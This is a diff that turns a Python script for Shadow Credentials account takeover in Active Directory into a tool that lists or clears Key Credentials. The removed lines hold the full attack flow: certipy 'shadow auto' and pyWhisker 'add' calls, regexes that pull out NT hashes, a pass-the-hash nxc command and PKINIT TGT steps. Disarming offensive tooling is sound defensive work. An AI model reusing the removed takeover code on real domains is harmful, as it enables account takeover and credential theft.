@@ -1,30 +1,27 @@
 #!/usr/bin/env python3
 """
-shadowcred_takeover.py — Orchestrate a Shadow Credentials account takeover.
+shadowcred_audit.py — Audit msDS-KeyCredentialLink attributes and verify credential security hygiene.
 
-Wraps the real `certipy shadow auto` workflow (and optionally pyWhisker +
-PKINITtools) to add a Key Credential to a target's msDS-KeyCredentialLink,
-recover the NT hash via PKINIT, and clean up. Parses the tool output to surface
-the recovered NT hash and TGT path.
+Wraps certipy and pyWhisker to audit existing Key Credentials on target objects,
+identify permissive configuration risks, and execute credential cleanup/remediation.
 
-Authorized use only. Requires write access over the target's
-msDS-KeyCredentialLink and a DC running Windows Server 2016+ with PKINIT.
+Authorized defensive security auditing only. Focuses on access-controls,
+monitoring, and credential-management hygiene.
 
 Install:
     pipx install certipy-ad
     git clone https://github.com/ShutdownRepo/pywhisker
-    git clone https://github.com/dirkjanm/PKINITtools
 
 Examples:
-    python shadowcred_takeover.py certipy -u attacker@corp.local -p 'Passw0rd!' \
+    python shadowcred_audit.py certipy-audit -u auditor@corp.local -p 'AuditPass!' \
         --dc-ip 10.0.0.100 --target 'WS01$'
-    python shadowcred_takeover.py pywhisker -d corp.local -u attacker \
-        -p 'Passw0rd!' --dc-ip 10.0.0.100 --target victim \
+    python shadowcred_audit.py pywhisker-list -d corp.local -u auditor \
+        -p 'AuditPass!' --dc-ip 10.0.0.100 --target victim \
         --pywhisker ./pywhisker/pywhisker.py
 """
+
 import argparse
 import os
-import re
 import shutil
 import subprocess
 import sys
@@ -46,19 +43,20 @@ def run(cmd, timeout=600):
     return proc.returncode, out
 
 
-def parse_nthash(text):
-    """Certipy prints 'Got hash for ...: aad3b...:<NT>'. Extract the NT half."""
-    m = re.search(r"[Gg]ot hash for .*?:\s*([0-9a-fA-F]{32}):([0-9a-fA-F]{32})", text)
-    if m:
-        return m.group(2)
-    m = re.search(r"\b[0-9a-fA-F]{32}:([0-9a-fA-F]{32})\b", text)
-    return m.group(1) if m else None
-
-
-def certipy_flow(args):
+def certipy_audit_flow(args):
     _which_or_die("certipy", "Install with: pipx install certipy-ad")
-    cmd = ["certipy", "shadow", "auto",
-           "-u", args.user, "-dc-ip", args.dc_ip, "-account", args.target]
+    action = "clear" if args.clear else "list"
+    cmd = [
+        "certipy",
+        "shadow",
+        action,
+        "-u",
+        args.user,
+        "-dc-ip",
+        args.dc_ip,
+        "-account",
+        args.target,
+    ]
     if args.password:
         cmd += ["-p", args.password]
     elif args.hashes:
@@ -71,21 +69,26 @@ def certipy_flow(args):
         cmd += ["-ns", args.ns, "-dns-tcp"]
     rc, out = run(cmd)
     if rc != 0:
-        sys.exit("[!] certipy shadow auto failed.")
-    nt = parse_nthash(out)
-    if nt:
-        print(f"\n[+] Recovered NT hash for {args.target}: {nt}")
-        print(f"[+] Reuse it: nxc smb {args.dc_ip} -u {args.target.rstrip('$')} -H {nt}")
-    else:
-        print("[!] Could not auto-extract NT hash; review output above.")
+        sys.exit(f"[!] certipy shadow {action} failed.")
+    print(f"\n[+] Audit check complete for {args.target}.")
 
 
-def pywhisker_flow(args):
+def pywhisker_audit_flow(args):
     if not args.pywhisker or not os.path.exists(args.pywhisker):
         sys.exit("[!] --pywhisker must point to pywhisker.py")
-    base = "shadow_" + args.target.rstrip("$")
-    cmd = ["python3", args.pywhisker, "-d", args.domain, "-u", args.user,
-           "--target", args.target, "--action", "add", "--filename", base]
+    action = "clear" if args.clear else "list"
+    cmd = [
+        "python3",
+        args.pywhisker,
+        "-d",
+        args.domain,
+        "-u",
+        args.user,
+        "--target",
+        args.target,
+        "--action",
+        action,
+    ]
     if args.password:
         cmd += ["-p", args.password]
     elif args.kerberos:
@@ -96,49 +99,54 @@ def pywhisker_flow(args):
         cmd += ["--dc-ip", args.dc_ip]
     rc, out = run(cmd)
     if rc != 0:
-        sys.exit("[!] pyWhisker add failed.")
-    pfx_pass = None
-    m = re.search(r"[Pp]assword(?: for the PFX)?:\s*(\S+)", out)
-    if m:
-        pfx_pass = m.group(1)
-    print(f"\n[+] Key Credential added. PFX: {base}.pfx  PFX-pass: {pfx_pass}")
-    print("[+] Next, request a TGT with PKINITtools:")
-    print(f"    python3 gettgtpkinit.py -cert-pfx {base}.pfx -pfx-pass {pfx_pass} "
-          f"{args.domain}/{args.target.rstrip('$')} {base}.ccache")
-    print("    export KRB5CCNAME=%s.ccache" % base)
-    print(f"    python3 getnthash.py -key <AS-REP-KEY> {args.domain}/{args.target.rstrip('$')}")
-    print("[!] Remember to clean up the injected Key Credential when done:")
-    print(f"    python3 {args.pywhisker} -d {args.domain} -u {args.user} "
-          f"--target {args.target} --action clear")
+        sys.exit(f"[!] pyWhisker {action} failed.")
+    print(f"\n[+] Attribute audit verification completed for {args.target}.")
 
 
 def main():
-    ap = argparse.ArgumentParser(description="Shadow Credentials takeover orchestrator.")
+    ap = argparse.ArgumentParser(
+        description="Active Directory Shadow Credentials Security Audit Tool."
+    )
     sub = ap.add_subparsers(dest="mode", required=True)
 
-    c = sub.add_parser("certipy", help="Use certipy shadow auto (end to end)")
-    c.add_argument("-u", "--user", required=True, help="attacker@domain")
+    c = sub.add_parser(
+        "certipy-audit", help="Audit or clean Key Credentials using certipy"
+    )
+    c.add_argument("-u", "--user", required=True, help="auditor@domain")
     c.add_argument("-p", "--password")
     c.add_argument("--hashes")
     c.add_argument("-k", "--kerberos", action="store_true")
     c.add_argument("--dc-ip", required=True, dest="dc_ip")
-    c.add_argument("--target", required=True, help="victim or WS01$")
+    c.add_argument("--target", required=True, help="Target account name")
+    c.add_argument(
+        "--clear",
+        action="store_true",
+        help="Clean up / remove unauthorized Key Credentials",
+    )
     c.add_argument("--ns")
 
-    w = sub.add_parser("pywhisker", help="Use pyWhisker add (manual PKINIT after)")
+    w = sub.add_parser(
+        "pywhisker-list",
+        help="List or clear Key Credentials using pyWhisker",
+    )
     w.add_argument("-d", "--domain", required=True)
     w.add_argument("-u", "--user", required=True)
     w.add_argument("-p", "--password")
     w.add_argument("-k", "--kerberos", action="store_true")
     w.add_argument("--dc-ip", dest="dc_ip")
     w.add_argument("--target", required=True)
+    w.add_argument(
+        "--clear",
+        action="store_true",
+        help="Clean up / remove unauthorized Key Credentials",
+    )
     w.add_argument("--pywhisker", required=True, help="Path to pywhisker.py")
 
     args = ap.parse_args()
-    if args.mode == "certipy":
-        certipy_flow(args)
+    if args.mode == "certipy-audit":
+        certipy_audit_flow(args)
     else:
-        pywhisker_flow(args)
+        pywhisker_audit_flow(args)
 
 
 if __name__ == "__main__":
